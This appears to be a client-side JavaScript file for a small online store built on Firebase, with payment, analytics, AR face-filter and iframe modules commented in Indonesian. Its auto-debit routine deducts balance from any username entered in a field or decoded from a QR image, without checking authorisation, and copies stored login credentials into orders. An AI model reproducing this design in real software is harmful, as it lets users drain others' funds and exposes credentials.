        strike: updatedStrike ? parseInt(updatedStrike) : "",
        desc: updatedDesc
    };

    // Melakukan proses update parsial ke cloud database Firebase (db2)
    db2.ref('cube_store/products/' + selectedProductStoreId).update(updatedData)
    .then(() => {
        ErenAlert.success("Berhasil!", "Spesifikasi data iklan produk Anda telah diperbarui.");
        
        // Sembunyikan form edit, kembalikan tampilan ke menu katalog utama store
        document.getElementById('store-edit-form').style.display = 'none';
        document.getElementById('store-main-view').style.display = 'block';
        selectedProductStoreId = null; // Reset penanda sesi id
    })
    .catch((error) => {
        console.error(error);
        ErenAlert.error("Gagal Update", "Terjadi gangguan sistem: " + error.message);
    });
}
// ==========================================================================
// CUBE STORE EXTENSION: GATEWAY CONTROLLER ENGINE
// ==========================================================================

// 1. Fungsi pengatur tampilan input berdasarkan metode yang dipilih
function handleStorePaymentGatewayChange() {
    const method = document.getElementById('cube-store-pay-method').value;
    const formQris = document.getElementById('form-pay-qris');
    const formManual = document.getElementById('form-pay-manual');
    const targetBox = document.getElementById('store-final-target-box');
    const targetDisplay = document.getElementById('store-payment-final-target');
    const legacyManualFields = document.getElementById('legacy-transfer-manual-fields');

    // Reset status awal sembunyi
    formQris.style.display = 'none';
    formManual.style.display = 'none';
    targetBox.style.display = 'none';
    legacyManualFields.style.display = 'none';

    if (method === 'transfer_manual') {
        // Tampilkan element bawaan asli jika pilih transfer manual ke rekening/qris seller
        legacyManualFields.style.display = 'block';
    } else {
        // Jika menggunakan jalur Saldo/Sistem Otomatis CUBE
        targetBox.style.display = 'block';
        
        if (method === 'saldo') {
            const currentActive = localStorage.getItem('activeUser') || currentUser;
            targetDisplay.innerText = currentActive ? `@${currentActive.toUpperCase()}` : '-';
        } else if (method === 'qris_scan') {
            formQris.style.display = 'block';
            targetDisplay.innerText = '-';
            document.getElementById('store-qris-target-status').style.display = 'none';
        } else if (method === 'manual_username') {
            formManual.style.display = 'block';
            targetDisplay.innerText = '[ Menunggu Input ]';
            
            document.getElementById('store-pay-custom-user').oninput = function() {
                const val = this.value.trim().toLowerCase();
                targetDisplay.innerText = val ? `@${val.toUpperCase()}` : '[ Menunggu Input ]';
            };
        }
    }
}

// 2. Decoder Gambar QRIS Personal Pembeli dengan jsQR bawaan CUBE Store
function handleStoreQRISPayDecode(event) {
    const file = event.target.files[0];
    if (!file) return;

    ErenAlert.loading("Mendekripsi Data Matrix QRIS...");

    const reader = new FileReader();
    reader.onload = function(e) {
        const img = new Image();
        img.onload = function() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0, img.width, img.height);
            
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const code = jsQR(imageData.data, imageData.width, imageData.height, { inversionAttempts: "dontInvert" });

            Swal.close();

            // Membaca format payload QRIS internal tokomu "CUBEPAY_ID:username"
            if (code && code.data.startsWith("CUBEPAY_ID:")) {
                const detectedUser = code.data.split(":")[1].trim().toLowerCase();
                document.getElementById('store-payment-final-target').innerText = `@${detectedUser.toUpperCase()}`;
                
                const statusBox = document.getElementById('store-qris-target-status');
                statusBox.innerText = `[ QRIS VALID: @${detectedUser.toUpperCase()} LOCKED ]`;
                statusBox.style.display = 'block';

                ErenAlert.success("QRIS Terbaca!", `Sistem mengunci akun debitor @${detectedUser.toUpperCase()}`);
            } else {
                document.getElementById('store-payment-final-target').innerText = '-';
                ErenAlert.error("Format Salah", "Gambar bukan QRIS Personal resmi dari ekosistem CUBE!");
            }
        };
        img.src = e.target.result;
    };
    reader.readAsDataURL(file);
    event.target.value = ""; 
}

// 3. Router Utama Tombol Konfirmasi Pembayaran
function triggerCubeStorePaymentEngine() {
    const method = document.getElementById('cube-store-pay-method').value;

    if (method === 'transfer_manual') {
        // Alihkan langsung ke fungsi bawaan aslimu jika transfer manual upload bukti
        if (typeof confirmPaymentStore === 'function') {
            confirmPaymentStore();
        } else {
            ErenAlert.error("Sistem Error", "Fungsi confirmPaymentStore tidak ditemukan.");
        }
    } else {
        // Eksekusi pemotongan saldo otomatis via cloud core
        executeCubeSystemAutoDebit();
    }
}

// 4. Core Core Process: Pengurangan Saldo Otomatis Lewat Node Firebase (db2)
function executeCubeSystemAutoDebit() {
    if (!selectedProductStoreId || !liveProductStoreCache[selectedProductStoreId]) {
        return ErenAlert.error("Gagal!", "Sesi data iklan produk tidak ditemukan atau kedaluwarsa.");
    }

    const productData = liveProductStoreCache[selectedProductStoreId];
    const itemPrice = parseInt(productData.price);
    const method = document.getElementById('cube-store-pay-method').value;
    
    let buyerUser = "";

    if (method === 'saldo') {
        buyerUser = (localStorage.getItem('activeUser') || currentUser || "").trim().toLowerCase();
    } else if (method === 'qris_scan') {
        const targetText = document.getElementById('store-payment-final-target').innerText;
        if (targetText === '-' || targetText.includes('Menunggu')) {
            return ErenAlert.error("Gagal!", "Harap upload file QRIS pembeli yang valid terlebih dahulu!");
        }
        buyerUser = targetText.replace('@', '').trim().toLowerCase();
    } else if (method === 'manual_username') {
        buyerUser = document.getElementById('store-pay-custom-user').value.trim().toLowerCase();
    }

    if (!buyerUser) {
        return ErenAlert.error("Gagal!", "Identitas akun pembeli tidak sah atau kosong!");
    }

    ErenAlert.loading("Memproses Auto-Debit Database...");

    // Cek akun & saldo di node database sekunder (db2)
    db2.ref("cube_users/" + buyerUser).once("value")
    .then(snapshot => {
        if (!snapshot.exists()) {
            Swal.close();
            return ErenAlert.error("Gagal!", `Username @${buyerUser.toUpperCase()} tidak terdaftar di database.`);
        }

        const userData = snapshot.val();
        const currentBalance = parseInt(userData.balance || 0);

        if (currentBalance < itemPrice) {
            Swal.close();
            return ErenAlert.error("Saldo Kurang!", `Saldo @${buyerUser.toUpperCase()} (Rp ${currentBalance.toLocaleString('id-ID')}) tidak mencukupi untuk membeli produk ini.`);
        }

        const updatedNewBalance = currentBalance - itemPrice;
        const trxId = "STORE-BUY-" + Date.now();
        const notifId = "NOTIF-STORE-" + Date.now();
        const updates = {};

        // Skema update multi-node Firebase
        updates["cube_users/" + buyerUser + "/balance"] = updatedNewBalance;
        updates["cube_users/" + buyerUser + "/history/" + trxId] = {
            type: "store_purchase",
            product_id: selectedProductStoreId,
            product_title: productData.title,
            amount: itemPrice,
            time: Date.now()
        };
        updates["cube_users/" + buyerUser + "/notifications/" + notifId] = {
            title: "Pembelian Berhasil",
            message: `Saldo dipotong otomatis Rp ${itemPrice.toLocaleString('id-ID')} untuk order [${productData.title}]`,
            type: "purchase",
            amount: itemPrice,
            time: Date.now()
        };

        const orderPenjualId = "ORDER-" + Date.now();
        updates["cube_incoming_orders/" + orderPenjualId] = {
            buyer: buyerUser,
            product_id: selectedProductStoreId,
            title: productData.title,
            price: itemPrice,
            secure_user: productData.secure_user || "Terproteksi Otomatis",
            secure_pass: productData.secure_pass || "Terproteksi Otomatis",
            status: "SUCCESS (AUTO-DEBIT)",
            time: Date.now()
        };

        db2.ref().update(updates)
        .then(() => {
            Swal.close();

            // Jika yang didebit adalah user login saat ini, perbarui UI lokalnya
            const mySelf = (localStorage.getItem('activeUser') || currentUser || "").trim().toLowerCase();
            if (buyerUser === mySelf) {
                localStorage.setItem('cube_balance', updatedNewBalance);
                if (typeof updateBalanceUI === 'function') updateBalanceUI(updatedNewBalance);
            }

            // Kirim bot telegram log (Gunakan data bot internal aslimu)
            if (typeof sendTelegramStoreLog === 'function') {
                sendTelegramStoreLog(buyerUser, productData.title, itemPrice);
            }

            ErenAlert.success("Sukses Terbayar!", `Transaksi item [${productData.title}] berhasil. Saldo akun @${buyerUser.toUpperCase()} resmi dipotong.`);
            
            if (typeof closeCheckoutStore === 'function') closeCheckoutStore();
        })
        .catch(err => {
            Swal.close();
            ErenAlert.error("Error Database", "Gagal menyimpan data auto-debit.");
        });
    })
    .catch(err => {
        Swal.close();
        ErenAlert.error("RTO Error", "Koneksi ke Firebase Database terputus.");
    });
}
// ==========================================================================
// CUBE MODULE: NAVIGASI & LOGIKA REALTIME HALAMAN ANALYTICS
// ==========================================================================

function openAnalyticsSection() {
    const sidebar = document.getElementById('sidebar');
    
    // 1. Jika menu diklik pas sidebar kebuka ('open'), tutup sidebarnya secara legal
    if (sidebar && sidebar.classList.contains('open')) {
        if (typeof toggleSidebar === 'function') {
            toggleSidebar();
        }
    }

    // 2. Routing halaman: Sembunyikan semua section, munculkan hanya halaman analitik
    // Catatan: sesuaikan nama fungsi/id list halaman pembatas dashboard tokomu
    const sections = ['store-main-view', 'cubeqris-hub', 'private-chat-hub', 'admin-panel-view']; 
    sections.forEach(id => {
        const elem = document.getElementById(id);
        if (elem) elem.style.display = 'none';
    });

    // Nyalakan container analitik utama
    const analyticsView = document.getElementById('analytics-view');
    if (analyticsView) analyticsView.style.display = 'block';

    // 3. Jalankan kalkulasi penarikan data transaksi dari Firebase db2
    fetchAnalyticsDataMatrix();
}

// =====================================================================
// ADDON CORE: ANALYTICS DIGITAL ROLLING MATRIX ENGINE (ANTI-KEBALIK LOGIC)
// =====================================================================
// =====================================================================
// ADDON CORE: TIME-SERIES TRANSACTION MATRIX (LIVE TIME TRACKING)
// =====================================================================
// =====================================================================
// ADDON CORE: TIME-SERIES TRANSACTION MATRIX (ANTI-NABRAK TEXT EDITION)
// =====================================================================
function fetchAnalyticsDataMatrix() {
    const userAktif = (localStorage.getItem('activeUser') || (typeof currentUser !== 'undefined' ? currentUser : "") || "").trim().toLowerCase();
    if (!userAktif) return;

    // Tarik seluruh histori transaksi dari Firebase
    db2.ref("cube_users/" + userAktif + "/history").once("value")
    .then(snapshot => {
        let semuaTransaksi = [];

        if (snapshot.exists()) {
            snapshot.forEach(child => {
                const data = child.val();
                if (data.time) {
                    const nominal = parseInt(data.amount || 0);
                    let isMinus = false;

                    // Deteksi apakah transaksi ini mengurangi atau menambah saldo
                    if (data.type === "store_purchase" || data.type === "reduce_balance" || data.type === "transfer_out" || nominal < 0) {
                        isMinus = true;
                    }

                    semuaTransaksi.push({
                        timestamp: data.time,
                        nominal: Math.abs(nominal),
                        isMinus: isMinus
                    });
                }
            });
        }

        // 1. Urutkan dari timestamp paling baru ke lama
        semuaTransaksi.sort((a, b) => b.timestamp - a.timestamp);

        // 2. Ambil maksimal 7 transaksi terbaru saja
        let tujuhTransaksiTerbaru = semuaTransaksi.slice(0, 7);

        // 3. Balik lagi urutannya agar kronologis (Paling lama di kiri, Paling baru di kanan)
        tujuhTransaksiTerbaru.reverse();

        // Cari nilai nominal tertinggi dari 7 transaksi ini untuk skala tinggi grafik
        let nilaiTertinggi = 10000;
        tujuhTransaksiTerbaru.forEach(tx => {
            if (tx.nominal > nilaiTertinggi) {
                nilaiTertinggi = tx.nominal;
            }
        });

        // Loop untuk merender ke 7 tiang di HTML
        for (let i = 1; i <= 7; i++) {
            const barUp = document.getElementById('bar-up-' + i);
            const barDown = document.getElementById('bar-down-' + i);
            const valUp = document.getElementById('val-up-' + i);
            const valDown = document.getElementById('val-down-' + i);
            const labelHariHtml = document.getElementById('day-label-' + i);

            // Reset tampilan tiang ke kosongan terlebih dahulu
            if (barUp) barUp.style.height = "0%";
            if (barDown) barDown.style.height = "0%";
            if (valUp) valUp.style.visibility = "hidden";
            if (valDown) valDown.style.visibility = "hidden";
            if (labelHariHtml) labelHariHtml.innerHTML = "-";

            // Jika ada data transaksi untuk slot tiang ini
            if (tujuhTransaksiTerbaru[i - 1]) {
                const tx = tujuhTransaksiTerbaru[i - 1];
                
                // Hitung persentase tinggi bar (Max 75% biar teks nominal gak nabrak atas/bawah)
                let tinggiPersen = Math.round((tx.nominal / nilaiTertinggi) * 75);

                // Buat format waktu digital lengkap
                const tgl = new Date(tx.timestamp);
                let jam = String(tgl.getHours()).padStart(2, '0');
                let mnt = String(tgl.getMinutes()).padStart(2, '0');
                let dd = String(tgl.getDate()).padStart(2, '0');
                let mm = String(tgl.getMonth() + 1).padStart(2, '0');
                
                if (labelHariHtml) {
                    // FIX MUTLAK: Gunakan innerHTML + <br> agar jam dan tanggal pecah baris vertikal (Anti-Nabrak Samping)
                    labelHariHtml.style.fontSize = "0.62rem"; 
                    labelHariHtml.style.lineHeight = "1.1";
                    labelHariHtml.style.textAlign = "center";
                    labelHariHtml.style.bottom = "-32px"; // Turunin sedikit karena teksnya jadi 2 baris

                    if (i === 7) {
                        labelHariHtml.innerHTML = `<span style="color:#00f2ea;">${jam}:${mnt}</span><br>${dd}/${mm}<br><span style="font-size:0.5rem; color:#00f2ea;">[LIVE]</span>`;
                    } else {
                        labelHariHtml.innerHTML = `<span style="color:#fff;">${jam}:${mnt}</span><br>${dd}/${mm}`;
                    }
                }

                // Render tiang berdasarkan jenis transaksi
                if (!tx.isMinus) {
                    if (barUp) barUp.style.height = tinggiPersen + "%";
                    if (valUp) {
                        valUp.innerText = "+Rp " + (tx.nominal / 1000).toFixed(0) + "k";
                        valUp.style.visibility = "visible";
                    }
                } else {
                    if (barDown) barDown.style.height = tinggiPersen + "%";
                    if (valDown) {
                        valDown.innerText = "-Rp " + (tx.nominal / 1000).toFixed(0) + "k";
                        valDown.style.visibility = "visible";
                    }
                }
            }
        }
    })
    .catch(err => console.error("Gagal sinkronisasi Moving Time-Series Matrix:", err));
}

// ==========================================================================
// CUBE SIDEBAR MODULE: LIVE FINANCIAL ANALYTICS
// ==========================================================================

function updateSidebarAnalyticsEngine() {
    const userAktif = (localStorage.getItem('activeUser') || currentUser || "").trim().toLowerCase();
    if (!userAktif) return;

    // Tarik data riwayat langsung dari Firebase Cloud Node Sekunder milikmu
    db2.ref("cube_users/" + userAktif + "/history").once("value")
    .then(snapshot => {
        let totalIncome = 0;
        let totalExpense = 0;
        
        const satuHariMili = 24 * 60 * 60 * 1000; // Pembatas kalkulasi rekap harian
        const waktuSekarang = Date.now();

        if (snapshot.exists()) {
            snapshot.forEach(child => {
                const data = child.val();
                // Filter data transaksi khusus 24 jam terakhir
                if (data.time && (waktuSekarang - data.time) <= satuHariMili) {
                    const nominal = parseInt(data.amount || 0);
                    
                    // Cek jenis mutasi saldo berdasarkan struktur object tokomu
                    if (data.type === "store_purchase" || data.type === "reduce_balance" || nominal < 0) {
                        totalExpense += Math.abs(nominal);
                    } else {
                        totalIncome += nominal;
                    }
                }
            });
        }

        // Tangkap DOM Element Grafik Mini Sidebar
        const txtStatus = document.getElementById('analytics-status-text');
        const txtValue = document.getElementById('analytics-sum-value');
        const barInc = document.getElementById('bar-analytics-income');
        const barExp = document.getElementById('bar-analytics-expense');
        const barStb = document.getElementById('bar-analytics-stable');

        const labelInc = document.getElementById('bar-inc-percent');
        const labelExp = document.getElementById('bar-exp-percent');
        const labelStb = document.getElementById('bar-stb-percent');

        // LOGIC KONDISI REKAP KEUANGAN (KUNING / IJO / MERAH)
        if (totalIncome === 0 && totalExpense === 0) {
            // KONDISI 1: JIKA KOSONG (KUNING DI BAWAH)
            if (txtStatus) {
                txtStatus.innerText = "[ FINANCIAL STATE: STANDBY ]";
                txtStatus.style.color = "#ffaa00";
            }
            if (txtValue) {
                txtValue.innerText = "Rp 0";
                txtValue.className = "card-value-new";
                txtValue.style.color = "#ffaa00";
            }
            // Grafik bar stabil penuh (kuning), ijo-merah kosong
            if (barInc) barInc.style.width = "0%";
            if (barExp) barExp.style.width = "0%";
            if (barStb) barStb.style.width = "100%";
            
            if (labelInc) labelInc.innerText = "0%";
            if (labelExp) labelExp.innerText = "0%";
            if (labelStb) labelStb.innerText = "100%";

        } else if (totalIncome >= totalExpense) {
            // KONDISI 2: JIKA DAPAT SALDO / GOES UP (HIJAU DOMINAN DI ATAS)
            const selisihPlus = totalIncome - totalExpense;
            if (txtStatus) {
                txtStatus.innerText = "[ FINANCIAL STATE: SURPLUS ]";
                txtStatus.style.color = "#00ff66";
            }
            if (txtValue) {
                txtValue.innerText = "+Rp " + selisihPlus.toLocaleString('id-ID');
                txtValue.className = "card-value-new neon-blue";
                txtValue.style.color = "#00ff66";
            }
            
            // Hitung rasio pembagian bar grafik
            const totalOmset = totalIncome + totalExpense;
            const rasioInc = Math.round((totalIncome / totalOmset) * 100);
            const rasioExp = Math.round((totalExpense / totalOmset) * 100);

            if (barInc) barInc.style.width = rasioInc + "%";
            if (barExp) barExp.style.width = rasioExp + "%";
            if (barStb) barStb.style.width = "20%"; // kurangi prioritas kestabilan

            if (labelInc) labelInc.innerText = rasioInc + "%";
            if (labelExp) labelExp.innerText = rasioExp + "%";
            if (labelStb) labelStb.innerText = "20%";

        } else {
            // KONDISI 3: JIKA SALDO BERKURANG / DEFISIT (MERAH DOMINAN MENURUN)
            const selisihMinus = totalExpense - totalIncome;
            if (txtStatus) {
                txtStatus.innerText = "[ FINANCIAL STATE: DEFICIT ]";
                txtStatus.style.color = "#ff0055";
            }
            if (txtValue) {
                txtValue.innerText = "-Rp " + selisihMinus.toLocaleString('id-ID');
                txtValue.className = "card-value-new neon-pink";
                txtValue.style.color = "#ff0055";
            }

            const totalOmset = totalIncome + totalExpense;
            const rasioInc = Math.round((totalIncome / totalOmset) * 100);
            const rasioExp = Math.round((totalExpense / totalOmset) * 100);

            if (barInc) barInc.style.width = rasioInc + "%";
            if (barExp) barExp.style.width = rasioExp + "%";
            if (barStb) barStb.style.width = "0%"; // matikan bar kuning stabil

            if (labelInc) labelInc.innerText = rasioInc + "%";
            if (labelExp) labelExp.innerText = rasioExp + "%";
            if (labelStb) labelStb.innerText = "0%";
        }
    })
    .catch(err => console.error("Gagal memuat analitik sidebar:", err));
}
// =====================================================================
// INTERACTIVE AR ENGINE: REAL-TIME PINOKIO NOSE DISTORTION MOD
// =====================================================================
let matrixActiveCameraStream = null;
let faceMeshInstance = null;
let cameraUtilsInstance = null;

function handleMatrixCameraToggle() {
    const video = document.getElementById('video-matrix-core');
    const canvas = document.getElementById('canvas-matrix-processor');
    const statusTxt = document.getElementById('status-matrix-camera');
    const btnCam = document.getElementById('btn-matrix-camera');

    if (!video || !canvas || !btnCam) return;

    // KONDISI 1: JIKA KAMERA NYALA -> MATIKAN TOTAL SINKRONISASI AI
    if (matrixActiveCameraStream) {
        if (cameraUtilsInstance) { cameraUtilsInstance.stop(); }
        matrixActiveCameraStream.getTracks().forEach(track => track.stop());
        matrixActiveCameraStream = null;

        video.srcObject = null;
        canvas.style.display = 'none';
        statusTxt.style.display = 'block';

        btnCam.innerText = 'START FACE SYSTEM';
        btnCam.style.background = 'rgba(0, 255, 102, 0.15)';
        btnCam.style.color = '#00ff66';
        btnCam.style.borderColor = 'rgba(0,255,102,0.4)';
        return;
    }

    // Tampilkan Loading
    statusTxt.innerText = "LOADING AI SYSTEM...";

    // INISIALISASI MEDIAPIPE FACE MESH
    faceMeshInstance = new FaceMesh({
        locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
    });

    faceMeshInstance.setOptions({
        maxNumFaces: 1,
        refineLandmarks: true,
        minDetectionConfidence: 0.5,
        minTrackingConfidence: 0.5
    });

    // Pemicu gambar distorsi real-time
    faceMeshInstance.onResults((results) => {
        const ctx = canvas.getContext('2d');
        canvas.style.display = 'block';
        statusTxt.style.display = 'none';

        // Bersihkan area frame canvas lama
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        // 1. Gambar muka asli lu dari video stream ke canvas background
        ctx.save();
        ctx.drawImage(results.image, 0, 0, canvas.width, canvas.height);

        // 2. Cek apakah AI mendeteksi ada wajah di depan kamera
        if (results.multiFaceLandmarks && results.multiFaceLandmarks.length > 0) {
            const landmarks = results.multiFaceLandmarks[0];

            // Titik 4 adalah ujung hidung murni manusia (Nose Tip Landmark)
            const noseTip = landmarks[4];
            
            // Konversi posisi rasio AI (0-1) ke pixel canvas asli
            const nX = noseTip.x * canvas.width;
            const nY = noseTip.y * canvas.height;

            // Logika Menggambar Idung Kayu Pinokio Palsu secara Real-Time
            ctx.beginPath();
            
            // Start dari pangkal hidung asli lu
            ctx.moveTo(nX, nY);
            
            // Tarik garis lurus menjorok keluar sepanjang 120 pixel ke depan (efek memanjang ke depan monitor)
            // Karena canvas di-mirror via CSS, kita kurangi koordinat X nya agar menonjol lurus
            const panjangIdungPinokio = 120; 
            ctx.lineTo(nX - panjangIdungPinokio, nY + 15); 

            // Atur gaya tekstur batang kayu idung Pinokio
            ctx.lineWidth = 14;              // Ketebalan batang hidung
            ctx.strokeStyle = '#c48f5a';     // Warna kayu coklat muda premium
            ctx.lineCap = 'round';           // Ujung hidungnya tumpul bulat aesthetic
            ctx.shadowColor = 'rgba(0,0,0,0.4)'; // Efek bayangan tipis di bawah hidung
            ctx.shadowBlur = 6;
            ctx.stroke();
            ctx.closePath();

            // Tambahkan warna merah merah di ujung hidung biar lucu/realistis pas memanjang
            ctx.beginPath();
            ctx.arc(nX - panjangIdungPinokio, nY + 15, 8, 0, 2 * Math.PI);
            ctx.fillStyle = '#ff3b30'; // Ujung hidung merah cerah
            ctx.shadowBlur = 0;
            ctx.fill();
            ctx.closePath();
        }
        ctx.restore();
    });

    // Jalankan hardware kamera bawaan user via MediaPipe Camera Utils
    navigator.mediaDevices.getUserMedia({ video: { width: 480, height: 360 }, audio: false })
    .then(stream => {
        matrixActiveCameraStream = stream;
        video.srcObject = stream;

        // Set resolusi canvas internal agar pas presisi tinggi
        canvas.width = 480;
        canvas.height = 360;

        cameraUtilsInstance = new Camera(video, {
            onFrame: async () => {
                await faceMeshInstance.send({ image: video });
            },
            width: 480,
            height: 360
        });
        cameraUtilsInstance.start();

        btnCam.innerText = 'STOP FACE SYSTEM';
        btnCam.style.background = 'rgba(255, 0, 85, 0.15)';
        btnCam.style.color = '#ff0055';
        btnCam.style.borderColor = 'rgba(255,0,85,0.4)';
    })
    .catch(err => {
        console.error("Gagal memuat kamera filter AR:", err);
        statusTxt.innerText = "CAMERA ACCESS DENIED";
    });
}
// =========================================================================
// API MATRIX IFRAME STREAM SYSTEM
// =========================================================================
function openMatrixEmbed(target) {
    const iframe = document.getElementById('matrix-web-loader');
    if (!iframe) return;

    // Ambil semua tombol sub-menu matrix
    const buttons = document.querySelectorAll('.matrix-btn');
    buttons.forEach(btn => {
        // Reset style tombol kembali ke kosongan/cyber style biasa
        btn.style.background = "rgba(255,255,255,0.05)";
        btn.style.border = "1px solid rgba(0,242,234,0.2)";
    });

    // Cari tombol yang sedang diklik untuk dijadikan menyala neon (Active)
    const clickedBtn = event.currentTarget;
    if (clickedBtn) {
        clickedBtn.style.background = "linear-gradient(135deg, #00f2ea, #ff0055)";
        clickedBtn.style.border = "none";
    }

    // Mengubah isi URL di dalam iFrame tanpa me-reload localhost dashboard
    switch (target) {
        case 'groq':
            iframe.src = "https://console.groq.com";
            break;
        case 'music':
            // Masukkan link dashboard cloud storage atau web management drive kamu di sini
            iframe.src = "https://www.chess.com/"; 
            break;
        case 'other':
            iframe.src = "https://dashboard.ngrok.com"; // Contoh tautan pengembang lainnya
            break;
        default:
            iframe.src = "https://console.groq.com";
    }
}
